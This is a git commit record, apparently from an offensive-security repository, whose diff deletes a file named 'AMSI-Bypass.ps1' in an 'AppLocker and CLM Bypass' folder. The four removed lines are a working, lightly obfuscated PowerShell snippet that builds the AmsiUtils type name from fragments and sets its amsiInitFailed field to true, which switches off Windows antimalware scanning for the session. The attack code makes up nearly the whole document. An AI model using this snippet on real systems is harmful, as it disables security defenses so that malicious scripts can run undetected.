f505252ca922f59f2a8bff61cf78d7f0fdf893f3
williamzou1999 <126434663+williamzou1999@users.noreply.github.com>
2023-10-27 23:04:05 +0800

    hi

--- AppLocker and CLM Bypass/AMSI-Bypass.ps1
+++
@@ -1,4 +0,0 @@
-$a = 'System.Management.Automation.A';$b = 'ms';$c = 'Utils'
-$d = [Ref].Assembly.GetType(('{0}{1}i{2}' -f $a,$b,$c))
-$e = $d.GetField(('a{0}iInitFailed' -f $b),'NonPublic,Static')
-$e.SetValue($null,$true)
